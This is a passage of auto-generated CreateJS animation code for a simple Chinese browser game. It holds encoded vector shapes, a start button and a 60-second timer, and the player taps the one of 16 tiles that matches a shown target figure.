	// 图层 1
	this.shape = new cjs.Shape();
	this.shape.graphics.f("#FFDCE9").s().p("AhUB/QAAhCAthLQAwhVBMgqIgBAaQgDAhgIAhQgdBphPBHQgNAKgPAEIgIABQgNAAAAgPg");
	this.shape.setTransform(65.2,24.5);

	this.shape_1 = new cjs.Shape();
	this.shape_1.graphics.f("#FFDCE9").s().p("AhUB/QABhCAshLQAwhVBMgqIgBAaQgCAhgJAhQgcBphQBHQgMAKgQAEIgHABQgOAAAAgPg");
	this.shape_1.setTransform(35.6,24.5);

	this.shape_2 = new cjs.Shape();
	this.shape_2.graphics.f("#000000").s().p("AgTAUQgJgIAAgMQAAgLAJgIQAJgJAKAAQAMAAAIAJQAJAIAAALQAAAMgJAIQgIAJgMAAQgKAAgJgJg");
	this.shape_2.setTransform(12.1,59.9);

	this.shape_3 = new cjs.Shape();
	this.shape_3.graphics.f("#000000").s().p("AgTAVQgJgKAAgLQAAgLAJgIQAIgJALAAQAMAAAIAJQAJAIAAALQAAALgJAKQgIAIgMAAQgLAAgIgIg");
	this.shape_3.setTransform(47.6,66.4);

	this.shape_4 = new cjs.Shape();
	this.shape_4.graphics.f().s("#000000").ss(0.5).p("AgUgcIApA5");
	this.shape_4.setTransform(25.1,73.9);

	this.shape_5 = new cjs.Shape();
	this.shape_5.graphics.f().s("#000000").ss(0.5).p("AAfgRIg9Aj");
	this.shape_5.setTransform(25.1,73.9);

	this.shape_6 = new cjs.Shape();
	this.shape_6.graphics.f("#FC01FF").s().p("ADSHRInfAAQhaABhggYQjAgwgdh7QgOgrAShEQAkiJCgh4QAJhPAphWQBRirCjgfIAIARQAIAYACAfQAGBgg9B9IA3AEQALhCAnhDQBPiFCNgFIAHAXQAIAdADAgQAIBkguBTIA9ACQBKAFBEARQDZA4BHCfIAsgJQAvABAMAzIACALQACANgEARQgKA0g1A9IgMAgQgTAngjAfQhrBijXAAIgTAAg");
	this.shape_6.setTransform(68.3,46.6);

	this.shape_7 = new cjs.Shape();
	this.shape_7.graphics.f().s("#FFFFFF").ss(0.5).p("AAAAAIAVAdAAAAAIgeASAgUgcIAUAcAAfgRIgfAR");
	this.shape_7.setTransform(25.1,73.9);

	this.shape_8 = new cjs.Shape();
	this.shape_8.graphics.f("#FFFFFF").s().p("ADSHRInfAAQhaABhggYQjAgwgdh7QgOgrAShEQAkiJCgh4QACgSAEgTQAMg+AghCQBRirCjgfIAIARQAIAYACAfQAGBgg9B9IA3AEQALhCAnhDQBPiFCNgFIAHAXQAIAdADAgQAIBkguBTIA9ACQBKAFBEARQDZA4BHCfIAsgJQAvABAMAzIACALQACANgEARQgKA0g1A9IgMAgQgTAngjAfQhrBijXAAIgTAAgAmZEuIgVgdIAfgSIgfASIgWgdIAWAdIggASIAggSgAmuERg");
	this.shape_8.setTransform(68.3,46.6);

	this.timeline.addTween(cjs.Tween.get({}).to({state:[{t:this.shape_6},{t:this.shape_5},{t:this.shape_4},{t:this.shape_3},{t:this.shape_2},{t:this.shape_1},{t:this.shape}]}).to({state:[{t:this.shape_8},{t:this.shape_7}]},1).wait(3));

}).prototype = p = new cjs.MovieClip();
p.nominalBounds = new cjs.Rectangle(0,0,136.7,93.1);


(lib.Path = function() {
	this.initialize();

	// 图层 1
	this.shape = new cjs.Shape();
	this.shape.graphics.f("#FFFEFD").s().p("AsFcoQlliXkTkTQkUkTiXllQiclxAAmVQAAmTCclyQCXllEUkTQETkTFliYQFyicGTAAQGUAAFyCcQFlCYETETQEUETCWFlQCdFyAAGTQAAGVidFxQiWFlkUETQkTETllCXQlyCdmUAAQmTAAlyidg");
	this.shape.setTransform(231.9,230.2);

	this.addChild(this.shape);
}).prototype = p = new cjs.Container();
p.nominalBounds = new cjs.Rectangle(33,31.3,397.9,397.9);


(lib.Path_1 = function() {
	this.initialize();

	// 图层 1
	this.shape_1 = new cjs.Shape();
	this.shape_1.graphics.f("#FFFEFD").s().p("AnySfQjnhhiyiyQiyiyhhjmQhmjvABkFQgBkEBmjvQBhjmCyiyQCyiyDnhhQDuhlEEAAQEFAADvBlQDnBhCxCyQCyCyBiDmQBkDvAAEEQAAEFhkDvQhiDmiyCyQixCyjnBhQjvBlkFAAQkEAAjuhlg");
	this.shape_1.setTransform(161.4,160.4);

	this.addChild(this.shape_1);
}).prototype = p = new cjs.Container();
p.nominalBounds = new cjs.Rectangle(32.9,31.9,257,257);


(lib.Path_2 = function() {
	this.initialize();

	// 图层 1
	this.shape_2 = new cjs.Shape();
	this.shape_2.graphics.f("#FFFEFD").s().p("AmFOeQi1hNiLiLQiLiLhNi0QhPi7AAjMQAAjLBPi7QBNi0CLiLQCLiLC1hNQC6hPDLAAQDMAAC7BPQC0BNCLCLQCLCLBNC0QBPC7AADLQAADMhPC7QhMC0iMCLQiLCLi0BNQi7BPjMAAQjLAAi6hPg");
	this.shape_2.setTransform(132.8,132.2);

	this.addChild(this.shape_2);
}).prototype = p = new cjs.Container();
p.nominalBounds = new cjs.Rectangle(32.3,31.7,201.1,201);


(lib.游戏开始_bt = function(mode,startPosition,loop) {
	this.initialize(mode,startPosition,loop,{});

	// 图层 2
	this.shape = new cjs.Shape();
	this.shape.graphics.f("#202330").s().p("ADzCaIAAiDIhfAAQgGBog9AmQgYAPgQgNQgRgQAUgPQA3guADhDIhDAAQgTAAAAgVQABgTATgBIBFAAIAAhiIg8AAQgSAAgBgVQABgTASgCIEiAAQAQACACATQgCAVgQAAIgxAAIAABgIA9AAQAOACACATQgCAWgOAAIg9AAIAACDQgCATgVADQgUgDAAgTgACVgSIBeAAIAAhiIheAAgAiGBsQgmAcgeAJQgWAHgJgQQgFgSAYgMQAlgQAbgZQgMgkgGhKIghACQgTABgDgVQAAgTATgDIAhgBQgDgnAAgfQAAgPATgDQAVAAACAPQABAlADAhIBNgDQARAAADAUQgCAUgQABIhNADQAAAiAKAuQAYgfAPgZQAIgPARAIQAPAIgFASQgMAcguA4QAUArATADQAEAGAAgyQAAgPASgDQASACABAOQAABkgWgFIgFAAQgtAAgqhCgAoLCiQgcgaAigOQADAAALAFIALABQARADAEgaIgBgSIAAgLIgxAAQgSAAAAgUQAAgVASgCIApAAQgKgMABgHQAAgGARgQQAJgJAAgBIglAAQgYAAAEgYQgVACgBgSQgCgFAGgKIAFgKIhAAAIgBAiIAaAAQAeAAAAAWQgDChgWASQgMATgogJQgMgEAAgTQADgPANAAQARADABgJQANgtAAhIQAAgEgHAAIgMAAQgTB6gZAmQgMAOgRgGQgOgFAEgSQAAgFAGgHIAHgSQAhhJADh6IgSAAQgJAAgDgGQgDAHgKgBQgNAAghguIgCgFQgDgiAjAKIARAUQAIAJAHAGIAMgDIAnAAIgDgPQgDgSATgGQATgCAGASIAFAXIAdAAQAPADACANQAEgFALggIAEgLQAbgXANAfQAAAJgEAJIA7AAQAQABACAVQAAAWgQAAIhMAAIgOAbIBGAAQAYABgDAYQACANgnAlQgCAEALAPIAfAAQANACACAVQgCAUgNAAIgZAAQADBFgXAPQgIAIgPACIgMAAQgVAAgSgIgAGlCqQgYgDACgTQAAgJAOgLQAUgRANgSQg3gzAGgJQgDgEAbhRIAKgfIgSAAQgUAAAAgXQADgUAUgCIAYAAIADgSIADgHQAEgTAVAAQAXAEgDATQgDAJgCAMIAWAAQAegBgBAfQAAATgCAKQAJgTAnhGQANgUAVAEQASAJgGAWIguBSQAoABA4gHIgWg0QgIgSASgJQAUgGALAPQAdA6ARAwQAFAUgSAJQgTAEgJgQQgFgGgEgLQhBANg9ABQgfADgFgRQgDA9gcA2QAZAVAIANQAHAbgcABQgIgBgOgLIgMgMQglAwgUAAIgBAAgAG6AaQARAWALAGQAZg5AChQIgVAAQgLAlgXBIgAreCoQgQgHAIgTQARgrAOg8QAEgPASAAQASAFAAAPQgMBDgVAuQgJAMgNAAIgIgBgAKwCiIh0AAQgjACADgfIAAhlQgDgiAiACIB4AAQAogFgEApIAABhQAEAdgkAAIgHAAgAJFAvIAABHQAAAHAJAAIBYAAQAGAAABgJIAAhFQAAgJgGAAIhZAAQgJAAAAAJgAlpCPQgPgNASgSQAygtASgmIgZgYQgQgNgMgNQgSgSAMgQQAPgOAVAPIAjAhQAGgbADgyQgBgFgFAAIhBAAQgSAAgBgUQAAgVARgCIBcAAQAaAAAAAbQgCA+gQBEIAcAhQAPAWgLAPQgOAQgRgSIgSgTQgfA0glAbQgMAJgJAAQgHAAgGgFgArAABQgYgYgIgOQAAgkAgAMQAPAPASAZQACAZgSAAQgHAAgKgDgAhFhrIgTgVIgHgKQgOgOAMgNQAOgMAOAMQASAPAOATQAMASgPANQgGAEgFAAQgJAAgJgLg");
	this.shape.setTransform(108,39);

	this.timeline.addTween(cjs.Tween.get(this.shape).wait(4));

	// 图层 1
	this.shape_1 = new cjs.Shape();
	this.shape_1.graphics.f("#FFA300").s().p("ArqGbQiJAAhghPQhhhQgBhxIAAkVQABhxBhhPQBghQCJAAIXVAAQCJAABhBQQBhBPAABxIAAEVQAABxhhBQQhhBPiJAAg");
	this.shape_1.setTransform(107.8,41.2);

	this.shape_2 = new cjs.Shape();
	this.shape_2.graphics.f("#FFFFFF").s().p("ArqGbQiJAAhghPQhhhQgBhxIAAkVQABhxBhhPQBghQCJAAIXVAAQCJAABhBQQBhBPAABxIAAEVQAABxhhBQQhhBPiJAAg");
	this.shape_2.setTransform(107.8,41.2);

	this.timeline.addTween(cjs.Tween.get({}).to({state:[{t:this.shape_1}]}).to({state:[{t:this.shape_2}]},1).wait(3));

}).prototype = p = new cjs.MovieClip();
p.nominalBounds = new cjs.Rectangle(0,0,215.6,82.4);


(lib.mc = function(mode,startPosition,loop) {
	this.initialize(mode,startPosition,loop,{});

	// timeline functions:
	this.frame_0 = function() {
		var myGameObj = this;
		var waitStart = true;
		var inPlayGame =false;
		var targetNum;
		var mytmc;
		var outTime;
		
		
		//startGame();
		myGameObj.intoGame = function () {
			myGameObj.timeTxt.text = "60";
			myGameObj.guankaTxt.text = "0";
			inPlayGame =false;
			waitStart = true;
			guanka = 0;
			setTarget();
		}
		
		
		function setTarget(){
			targetNum = 1+ parseInt(16 * Math.random());
			myGameObj.changeMC.gotoAndStop(targetNum-1);
		}
		
		for(var i=1;i<17;i++){	
			mytmc=(myGameObj["tu_"+i]);
			mytmc.id=i;
			mytmc.addEventListener("pressup", fl_pressmoverHandler);
			
		}
		
		function fl_pressmoverHandler(event)
		{
			//console.log("dx:"+event.currentTarget);
			console.log("id:"+event.currentTarget.id);
			//mythis.mytext_txt.text=event.currentTarget.name;
			event.currentTarget.gotoAndPlay(2)
			if(targetNum == event.currentTarget.id){
				guanka++;
				myGameObj.guankaTxt.text = guanka;
				setTarget();
				if(waitStart==true){
					waitStart = false;
					inPlayGame = true;
					timeStart();
				}
			}
		}
		
		function timeStart() {
			outTime = 60;
			myGameObj.timeTxt.text = "60";
			window.setTimeout(function () {
				preMiao();
			}, 1000);
		}
		function preMiao() {
			if (inPlayGame == true) {
				if (outTime > 0) {
					outTime--;
					myGameObj.timeTxt.text = outTime;
		
					window.setTimeout(function () {
						preMiao();
					}, 1000);
		
				} else {
					//时间归0游戏结束
					inPlayGame = false;
					//showJieguo2("tout");
					//outGame();
					showEndMc()
				}
			}
		}
	}

	// actions tween:
	this.timeline.addTween(cjs.Tween.get(this).call(this.frame_0).wait(1));

	// 图层 2
	this.guankaTxt = new cjs.Text("600", "68px 'Arial'", "#FFFEFD");
	this.guankaTxt.name = "guankaTxt";
	this.guankaTxt.lineHeight = 82;
	this.guankaTxt.setTransform(505.1,80.8);

	this.timeTxt = new cjs.Text("60", "68px 'Arial'", "#FFFEFD");
	this.timeTxt.name = "timeTxt";
	this.timeTxt.lineHeight = 82;
	this.timeTxt.lineWidth = 118;
	this.timeTxt.setTransform(501.6,0.1);

	this.shape = new cjs.Shape();
	this.shape.graphics.f("#FFFEFD").s().p("Ah+AXQgKAAgHgIQgGgGgBgJQABgIAGgHQAHgGAKAAID9AAQAKAAAHAGQAGAHABAIQgBAJgGAGQgHAIgKAAg");
	this.shape.setTransform(454.7,42.6);

	this.shape_1 = new cjs.Shape();
	this.shape_1.graphics.f("#FFFEFD").s().p("AgPCPQgGgGgBgKIAAj9QABgKAGgHQAHgHAIAAQAKAAAGAHQAHAHgBAKIAAD9QABAKgHAGQgHAIgJAAQgIAAgHgIg");
	this.shape_1.setTransform(441.9,29.8);

	this.shape_2 = new cjs.Shape();
	this.shape_2.graphics.f("#2B2D30").s().p("AjBDCQhQhRgBhxQABhwBQhRQBQhRBxAAQBxAABRBRQBQBRAABwQAABxhQBRQhRBRhxAAQhxAAhQhRg");
	this.shape_2.setTransform(444.1,39.1);

	this.shape_3 = new cjs.Shape();
	this.shape_3.graphics.f("#FFFEFD").s().p("AjoDpQhghhAAiIQAAiHBghhQBhhhCHAAQCIAABhBhQBgBhAACHQAACIhgBhQhhBhiIAAQiHAAhhhhg");
	this.shape_3.setTransform(444,39.1);

	this.shape_4 = new cjs.Shape();
	this.shape_4.graphics.f("#FFFFFF").s().p("ABuDyIj5AAQgvAAgygMQhjgZgQhAQgHgXAJgjQAThHBUg+QABgLAEgPQAHggANgcQArhZBVgQIAJAlQADAygfBCIAcABIAGgVQAHgaANgWQAphFBJgCIAJArQAFA0gYAsIAfAAQAnADAjAJQBxAdAlBSIAXgFQAZAAAGAbIAAAWQgFAbgcAfQgFAbgdAbQg5AzhxAAIgIAAg");
	this.shape_4.setTransform(446.5,123.1);

	this.timeline.addTween(cjs.Tween.get({}).to({state:[{t:this.shape_4},{t:this.shape_3},{t:this.shape_2},{t:this.shape_1},{t:this.shape},{t:this.timeTxt},{t:this.guankaTxt}]}).wait(1));

	// 图层 3
	this.changeMC = new lib.嫦娥_mc();
	this.changeMC.setTransform(83.3,113.1,1,1,0,0,0,83.3,88.3);

	this.timeline.addTween(cjs.Tween.get(this.changeMC).wait(1));

	// 图层 1
	this.tu_16 = new lib.tu16();
	this.tu_16.setTransform(558.3,718.4,1,1,0,0,0,68.3,46.6);

	this.tu_15 = new lib.tu15();
	this.tu_15.setTransform(395.3,718.5,1,1,0,0,0,68.2,46.6);

	this.tu_14 = new lib.tu14();
	this.tu_14.setTransform(232.4,718.4,1,1,0,0,0,68.2,46.6);

	this.tu_13 = new lib.tu13();
	this.tu_13.setTransform(69.7,718.4,1,1,0,0,0,68.3,46.6);

	this.tu_12 = new lib.tu12();
	this.tu_12.setTransform(558.3,574,1,1,0,0,0,68.3,46.6);

	this.tu_11 = new lib.tu11();
	this.tu_11.setTransform(395.3,574,1,1,0,0,0,68.2,46.6);

	this.tu_10 = new lib.tu10();
	this.tu_10.setTransform(232.4,574,1,1,0,0,0,68.2,46.6);

	this.tu_9 = new lib.tu09();
	this.tu_9.setTransform(69.7,574,1,1,0,0,0,68.3,46.6);

	this.tu_8 = new lib.tu08();
	this.tu_8.setTransform(558.3,429.6,1,1,0,0,0,68.3,46.6);

	this.tu_7 = new lib.tu07();
	this.tu_7.setTransform(395.3,429.6,1,1,0,0,0,68.2,46.6);

	this.tu_6 = new lib.tu06();
	this.tu_6.setTransform(232.4,429.6,1,1,0,0,0,68.2,46.6);

	this.tu_5 = new lib.tu05();
	this.tu_5.setTransform(69.7,429.6,1,1,0,0,0,68.3,46.6);

	this.tu_4 = new lib.tu04();
	this.tu_4.setTransform(558.2,285.2,1,1,0,0,0,68.2,46.6);

	this.tu_3 = new lib.tu03();
	this.tu_3.setTransform(395.3,285.2,1,1,0,0,0,68.2,46.6);

	this.tu_2 = new lib.tu02();
	this.tu_2.setTransform(232.4,285.2,1,1,0,0,0,68.2,46.6);

	this.tu_1 = new lib.tu01();
	this.tu_1.setTransform(69.7,285.2,1,1,0,0,0,68.3,46.6);

	this.instance = new lib.Path_2();
	this.instance.setTransform(102.5,100.6,1,1,0,0,0,132.8,132.2);
	this.instance.shadow = new cjs.Shadow("rgba(255,188,39,0.208)",0,0,18);

	this.timeline.addTween(cjs.Tween.get({}).to({state:[{t:this.instance},{t:this.tu_1},{t:this.tu_2},{t:this.tu_3},{t:this.tu_4},{t:this.tu_5},{t:this.tu_6},{t:this.tu_7},{t:this.tu_8},{t:this.tu_9},{t:this.tu_10},{t:this.tu_11},{t:this.tu_12},{t:this.tu_13},{t:this.tu_14},{t:this.tu_15},{t:this.tu_16}]}).wait(1));

	// 图层 4
	this.shape_5 = new cjs.Shape();
	this.shape_5.graphics.f("#3E4149").s().p("AgVBiQgmgBgegUQgZATghgBQgjAAgZgWQgYgWAAgeQABgdAagUQAZgVAjABQAJAAAOADQAPgYAcgOQAcgPAhABQAiABAdARQAdASAMAcQAJgDANAAQAYABAUALQASAMAJAQIAJAAQASAAAMALQANALgBAQQAAAPgNALQgNAKgSAAQgMAAgKgGQgYAXgigBQgegBgXgSQgfAXgoAAIgEAAg");
	this.shape_5.setTransform(474.5,746);

	this.shape_6 = new cjs.Shape();
	this.shape_6.graphics.f("#2B2D30").s().p("Ah2IRQhmgChegdQhcgdhNgzQhAAwhOAYQhSAahYgCQi9gDiEh2QiEh1AEiiQADifCJhvQCIhwC+AEQBAACA5APQBRiDCVhLQCYhOC0AEQC+AECcBgQCZBdBDCVQA6gOA+ACQB/ACBoBAQBlA9AtBhQAcgEAUABQBhACBDA8QBDA7gCBTQgCBShFA5QhGA5hhgCQg/gBg2gdQg8A4hQAeQhTAehbgCQhRgChKgbQhHgag4guQhVA9hoAgQhlAfhpAAIgRAAg");
	this.shape_6.setTransform(353.3,774.8);

	this.shape_7 = new cjs.Shape();
	this.shape_7.graphics.f("#2B2D30").s().p("AgtDNQhOgCg/gpQg0AnhFgCQhKgCgzgtQgzguACg+QABg8A1gsQA1grBJABQAWABAZAGQAggzA5gdQA7geBGABQBIACA9AlQA7AkAaA6QAYgFAWAAQAyABAoAZQAnAYASAkIASgBQAmABAaAXQAaAXgBAgQAAAggcAWQgbAWglgBQgYAAgWgMQgXAWgfALQggANgjgBQhAgCgtgmQhDAxhVAAIgHAAg");
	this.shape_7.setTransform(493.4,142.4);

	this.shape_8 = new cjs.Shape();
	this.shape_8.graphics.f("#35373A").s().p("AhZGRQiagEh7hQQgwAkg8ATQg+AThCgBQiQgDhkhZQhkhZADh7QACh4BohVQBohUCPADQAuAAAvAMQA9hiBxg6QBzg7CIADQCQADB3BJQB0BHAyBxQAugKAtAAQBhACBPAwQBNAvAiBJQATgDAQAAQBKACAzAtQAzAugCA+QgBA/g1ArQg1ArhJgBQgxgCgogVQgtAqg9AWQg/AYhFgCQg9gBg4gUQg2gUgrgkQhAAvhQAYQhMAYhPAAIgNAAg");
	this.shape_8.setTransform(285.7,80.2);

	this.timeline.addTween(cjs.Tween.get({}).to({state:[{t:this.shape_8},{t:this.shape_7},{t:this.shape_6},{t:this.shape_5}]}).wait(1));

}).prototype = p = new cjs.MovieClip();
p.nominalBounds = new cjs.Rectangle(-16,-18,642.7,845.8);


(lib.introMc = function() {
	this.initialize();
	document.getElementById('moregame').style.display='none';;
	// 图层 1
	this.startBtn = new lib.游戏开始_bt();
	this.startBtn.setTransform(-0.8,-73,1,1,0,0,0,107.8,41.1);
	new cjs.ButtonHelper(this.startBtn, 0, 1, 2, false, new lib.游戏开始_bt(), 3);

	this.shape = new cjs.Shape();
	this.shape.graphics.f("#FFFEFD").s().p("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QgJgJAJgJQAIgHANAHIASARQAEAHgBAGIALAAIAAgdQAAgMAQgBQAOABACAMIAAAdIAPAAIAUgfQAHgJALAGQAKAGgFAJQgGANgEAGIAKAAQATABABATQAAAVgDAMQgEATgTgGIAAATQAAAVgUgCIgbAAIAAAMIArAAQAYgBgBAZIAAAzQAAAZgZAAQgmAAABgTQABgQASAEQALAEAAgHIAAgfQAAgEgEAAIgeAAIAABMQgBAMgPABQgQgBABgMgApRjpIAAAFQAAABAAABQABAAAAABQAAAAABAAQABABABAAIBDAAQAAAAABgBQABAAAAAAQABgBAAAAQAAgBAAgBIAAgFIgDgDIhDAAQgBAAgBAAQgBABAAAAQAAABgBAAQAAABAAAAgAn/kHIAOADQADgNgFAAIhsAAQgGAAACAFIAAAHIAKgCgAjahNQgNgNgFgPQgPAMgIAIQgNALgNgGQgHAIgPABQgVAAgOgJQgQgKAIgNQgLAAgLgOQgQASgRAOQgMAIgKgHQgLgKAIgJQAZgYAMgOIgUgTQgSgJAJgeQAHgjAFgkIgIAAQgNAAgCgPQABgQANgBIALAAIACgOIABgOQABgMAPAAQAPACAAALIgCAOIgBANIAZAAQAPABABATIAAARIAXAAIAAghQgFACgGAAQgRABgDgLQgDgPAQgEQAWgEAggJQAKgBAGAKQAFALgJAHQgJAGgJACIAAAmIAdAAIAAhAQAMgXASAWQAKgKAPALQAOANAJAMQAIAMgLAKQgLAIgJgJQgCgBgLgNQgKgLgCgDIAAAuIArAAQANABABAPQgBAPgNAAIgrAAQAAAtACAOIAOggIAEgJQAGgMAOAGQALAIgFANQgMAhgYAiQABAKAFAHQAEAMAFgCQAFgEACgQIAAgFIABgIQAAgPAOAAQANA